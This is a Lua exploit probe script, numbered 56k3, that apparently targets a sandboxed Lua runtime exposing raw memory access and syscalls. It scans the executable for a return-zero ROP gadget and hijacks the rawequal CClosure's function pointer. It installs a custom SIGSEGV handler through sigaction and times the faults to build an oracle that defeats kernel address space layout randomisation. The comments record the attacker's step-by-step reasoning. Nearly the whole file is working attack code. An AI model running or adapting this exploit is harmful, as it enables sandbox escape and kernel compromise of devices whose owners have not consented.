-- CRASH_CLASS: MODERATE
-- PROBE 56k3: External oracle — does crash behavior differ by address type?
--
-- Context: 56k2 showed pcall does NOT catch SIGSEGV from CClosure redirect.
-- But the process survived (COMPLETE, 754 bytes) — runtime's handler does
-- graceful cleanup, not hard kill. If the crash dump / response size / timing
-- differs between mapped kernel VA and unmapped kernel VA, that's our oracle.
--
-- Plan:
--   [A] Setup (parse_func_addr from 56c, gadget scan, timer)
--   [B] Print a marker, then redirect to ONE test address, let it crash
--   [C] The Python driver sends this probe repeatedly with different addrs
--
-- This probe tests a SINGLE address passed via the ADDR variable.
-- Run via: python tools/kaslr_external_oracle.py

print("=== PROBE 56k3: EXTERNAL ORACLE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)")
    if not hex then hex = s:match(":%s*([0-9a-fA-F]+)%s*$") end
    if not hex then hex = s:match("([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)") end
    if hex then return uint64("0x" .. hex) end
    return nil
end

collectgarbage("stop")

-- [A] Setup
local sc_info = make_syscall(593)
local info_buf = memory.alloc(0x200)
safe_wd(info_buf, 0x160)
pcall(function() sc_info(uint64(0), info_buf) end)
local eb_lo = safe_rd(info_buf + 0x108) or 0
local eb_hi = safe_rd(info_buf + 0x10C) or 0
local eb_sz = safe_rd(info_buf + 0x110) or 0
local eb_base = uint64(string.format("0x%X%08X", eb_hi, eb_lo))

local gadget_ret0 = nil
for off = 0, math.min(eb_sz - 3, 0x200000), 1 do
    local b = safe_rd(eb_base + off)
    if b then
        local b0 = b % 256
        local b1 = math.floor(b / 256) % 256
        local b2 = math.floor(b / 65536) % 256
        if b0 == 0x31 and b1 == 0xC0 and b2 == 0xC3 then
            gadget_ret0 = eb_base + off
            break
        end
    end
end

local cc_addr = parse_func_addr(rawequal)
if not cc_addr then
    print("FATAL: no CClosure")
    return
end
local orig_fn = safe_rq(cc_addr + 0x20)

-- Timer
local sc_clock = make_syscall(232)
local ts_buf = memory.alloc(16)
local function get_ns()
    safe_wq(ts_buf, uint64(0))
    safe_wq(ts_buf + 8, uint64(0))
    pcall(function() sc_clock(uint64(4), uint64(ts_buf)) end)
    local sec = safe_rd(ts_buf) or 0
    local nsec = safe_rd(ts_buf + 8) or 0
    return sec * 1000000000 + nsec
end

-- [B] Test multiple addresses in sequence
-- Each one: redirect, call, restore. If pcall doesn't catch it (which we
-- know it doesn't for unmapped userland), the crash handler runs and we
-- lose control. So test ONE address per connection.
--
-- But first: let's try a DIFFERENT approach. Instead of redirecting to the
-- target address (which tries to EXECUTE it), let's see if we can use the
-- CClosure redirect to call a KNOWN function (like a syscall wrapper) with
-- the target address as an argument.
--
-- Specifically: what if we redirect rawequal's +0x20 to the C function
-- behind madvise/mincore/etc via another CClosure? No — those crash.
--
-- New idea: what about redirecting to the sigaction C function itself?
-- We could try to install a handler at the target kernel VA and check
-- if sigaction returns differently.
-- No — sigaction handler must be userland.
--
-- Simplest viable test: try MULTIPLE kernel VAs in sequence, printing a
-- marker between each. The crash handler may allow some to survive if the
-- Lua runtime resets after each fault.
--
-- Actually, let's just test what the runtime's handler does more carefully.
-- Test 1: redirect to unmapped userland → observe output
-- Test 2: redirect to mapped kernel VA (KERNBASE) → observe output
-- If Test 1 produces output and Test 2 produces different output, oracle works.

print("SETUP_OK")
print(string.format("eboot=0x%X%08X cc=%s orig=%s",
    eb_hi, eb_lo, hexval(cc_addr), hexval(orig_fn)))

-- First try: maybe sigaction with OUR handler makes pcall work?
-- Install xor eax,eax;ret as handler with SA_SIGINFO (0x40)
if gadget_ret0 then
    local sa_new = memory.alloc(0x40)
    for i = 0, 15 do safe_wd(sa_new + i*4, 0) end
    safe_wq(sa_new, gadget_ret0)          -- sa_handler = xor eax,eax;ret
    safe_wd(sa_new + 8, 0x40)             -- SA_SIGINFO
    safe_wq(sa_new + 0x10, uint64(0))     -- sa_mask = empty

    local sc_sigaction = make_syscall(416)
    local sa_old = memory.alloc(0x40)
    local sa_ok, sa_ret = pcall(function()
        return sc_sigaction(uint64(11), uint64(sa_new), uint64(sa_old))
    end)
    print(string.format("sigaction install: ok=%s ret=%s",
        tostring(sa_ok), tostring(sa_ok and to_num(sa_ret) or "err")))

    if sa_ok and to_num(sa_ret) == 0 then
        -- Handler installed. Now test: does pcall catch fault with OUR handler?
        -- Our handler does xor eax,eax;ret which returns to sigreturn trampoline.
        -- sigreturn restores the faulting context → re-executes fault → infinite loop.
        -- To avoid infinite loop, we need SA_RESETHAND (0x4).
        -- After first fault: handler runs, then gets reset to SIG_DFL.
        -- Second fault: process killed by SIG_DFL.
        -- So we still can't loop. But maybe the first handler return is enough
        -- for pcall to notice?

        -- Try with SA_RESETHAND | SA_SIGINFO
        safe_wq(sa_new, gadget_ret0)
        safe_wd(sa_new + 8, 0x44)           -- SA_RESETHAND | SA_SIGINFO
        pcall(function()
            sc_sigaction(uint64(11), uint64(sa_new), uint64(0))
        end)
        print("installed xor-eax-ret handler with SA_RESETHAND|SA_SIGINFO")

        -- Test with unmapped userland
        print("TEST: redirect to 0x41414141_41414141")
        print("MARKER_BEFORE_FAULT")
        local t_before = get_ns()
        safe_wq(cc_addr + 0x20, uint64("0x4141414141414141"))
        local f_ok, f_ret = pcall(function() return rawequal(1, 2) end)
        safe_wq(cc_addr + 0x20, orig_fn)
        local t_after = get_ns()
        print("MARKER_AFTER_FAULT")
        print(string.format("fault: ok=%s ret=%s time=%d",
            tostring(f_ok), tostring(f_ret), t_after - t_before))

        -- If we get here, fault was caught!
        -- Re-install handler for next test
        safe_wq(sa_new, gadget_ret0)
        safe_wd(sa_new + 8, 0x44)
        pcall(function()
            sc_sigaction(uint64(11), uint64(sa_new), uint64(0))
        end)

        print("TEST: redirect to 0xFFFFFFFF_80000000 (KERNBASE)")
        print("MARKER_BEFORE_FAULT_2")
        t_before = get_ns()
        safe_wq(cc_addr + 0x20, uint64("0xFFFFFFFF80000000"))
        f_ok, f_ret = pcall(function() return rawequal(1, 2) end)
        safe_wq(cc_addr + 0x20, orig_fn)
        t_after = get_ns()
        print("MARKER_AFTER_FAULT_2")
        print(string.format("fault2: ok=%s ret=%s time=%d",
            tostring(f_ok), tostring(f_ret), t_after - t_before))
    end
else
    print("no gadget found, skipping custom handler test")
end

collectgarbage("restart")
print("")
print("=== PROBE 56k3 COMPLETE ===")
